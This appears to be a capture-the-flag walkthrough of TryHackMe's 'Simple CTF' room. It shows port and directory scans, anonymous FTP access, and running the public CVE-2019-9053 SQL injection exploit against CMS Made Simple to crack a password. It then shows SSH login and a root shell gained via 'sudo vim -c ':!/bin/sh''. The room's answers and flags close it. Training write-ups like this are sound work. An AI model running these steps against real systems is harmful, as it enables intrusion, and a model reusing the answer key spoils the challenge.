---
title: <img width="50" height="50" alt="front-page port 80-shoopyu" src="https://user-images.githubusercontent.com/95465072/209341582-f0dead6c-5576-443b-9efb-68ab1b79f6f2.png">  Simple CTF| Tryhackme | Easy
author: cotes
date: 2022-10-14 14:10:00 +0800
categories: [Write Up, TryHackMe]
tags: [walkthrough, simple-ctf, vim, sqli,cms-made-simple]
render_with_liquid: false
---
&nbsp;

<img width="488" allign="center" alt="simple-ctf-logo" src="https://user-images.githubusercontent.com/95465072/206484544-e9745f6e-1788-48ea-b4b2-5e393216fa85.png">

## Enumeration

```sh
sudo nmap -sV -sC <target-ip>
```


&nbsp;
&nbsp;
```
┌──(root㉿kali)-[/home/local_host/Desktop/CTF/simple_ctf]
|
└─# nmap -sV -sC 10.10.54.91             
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-08 06:50 EST
Nmap scan report for 10.10.54.91
Host is up (0.31s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.17.130
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 294269149ecad917988c27723acda923 (RSA)
|   256 9bd165075108006198de95ed3ae3811c (ECDSA)
|_  256 12651b61cf4de575fef4e8d46e102af6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.02 seconds

```

## FTP

```sh
ftp <target-ip>
```
> type name as **anonymous**
> go to pub directory and get ForMitch.txt
                                                                                                          
<img width="499" alt="ftp-loggedin-seession" src="https://user-images.githubusercontent.com/95465072/206484779-6dddad43-4e25-4757-b158-8bf5288891d0.png">




## HTTP

- open target-ip on browser

<img width="506" alt="apache-loginpage" src="https://user-images.githubusercontent.com/95465072/206484907-5a703e09-fb7b-4eca-99f9-977e89ddda01.png">


## Directory Bruteforcing

```sh
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u <target-ip>
```
&nbsp;

```
┌──(local_host㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.54.91
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.54.91
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbusteirectory-list-2.3-medium.txt                              
[+] Negative Status codes:   404                          
[+] User Agent:              gobuster/3.3                 
[+] Timeout:                 10s                          
============================================================                                                        
2022/12/08 07:22:10 Starting gobuster in directory enumeran mode                                                    
============================================================                                                        
/simple               (Status: 301) [Size: 311] [--> http://10.10.54.91/simple/]                                    
Progress: 6156 / 220561 (2.79%)^C
[!] Keyboard interrupt detected, terminating.             
===============================================================                                                     
2022/12/08 07:25:22 Finished                              
=============================================================== 
```

visit < target-ip>/simple

<img width="755" alt="cms-made-simple" src="https://user-images.githubusercontent.com/95465072/206485793-1784f900-dc48-43ad-a668-8f3a40fe36a0.png">

 
 

## [ CMS Made Simple - CVE-2019-9053](https://sckull.github.io/posts/simplectfthm/#cms-made-simple---cve-2019-9053)

[cms made simple 2.2.10 SQL Injection](https://www.exploit-db.com/exploits/46635)

> Download the exploit code from the above link
> **note**: There might be some errors in the exploit code fix it and then run the script 

&nbsp;

[Download best-1050.txt ](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/best1050.txt)
&nbsp;

```sh
python3 46635.py -u http://<targetip>/simple --crack -w /usr/share/wordlists/best_1050.txt
```

### Results:
```
┌──(local_host㉿kali)-[~/Desktop/CTF/simple_ctf]
└─$ python3 46635.py -u http://10.10.54.91/simple --crack -w /usr/share/wordlists/best_1050.txt

[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```
> **note**: It will take some time!!
> you can also exploit using msfconsole 
> ```searchsploit -m 46635```

## Login using SSH

```sh
ssh mitch@<target-ip> -p 2222
```
> as we know password is **secret**

## Privilege Escalation

> By looking into the directories we can see that we can leverage the **vim** 
> The great option to do this is  click here to get exploits [gtfobins](https://gtfobins.github.io/gtfobins/vim/#sudo)

```sh
sudo vim -c ':!/bin/sh'
```
> copy any one code and execute in mitch's machine!
> navigate to root directory 

<img width="425" alt="root-terminal" src="https://user-images.githubusercontent.com/95465072/206486022-22d2fa01-43d2-49dc-b757-4e21b1e99076.png">



## Answers

Q1 : How many services are running under port 1000?
```
2
```

Q2 : What is running on the higher port?
```
ssh
```

Q3 : What's the CVE you're using against the application?
```
CVE-2019-9053
```
Q4 : To what kind of vulnerability is the application vulnerable?
```
sqli
```

Q5 : What's the password?
```
secret
```
Q6 : Where can you login with the details obtained?
```
ssh
```
Q7: What's the user flag?
```
G00d j0b, keep up!
```
Q8: Is there any other user in the home directory? What's its name?
```
sunbath
 ```
 Q9:  What can you leverage to spawn a privileged shell?
```
vim
```
Q10:  What's the root flag?
```
W3ll d0n3. You made it!
```
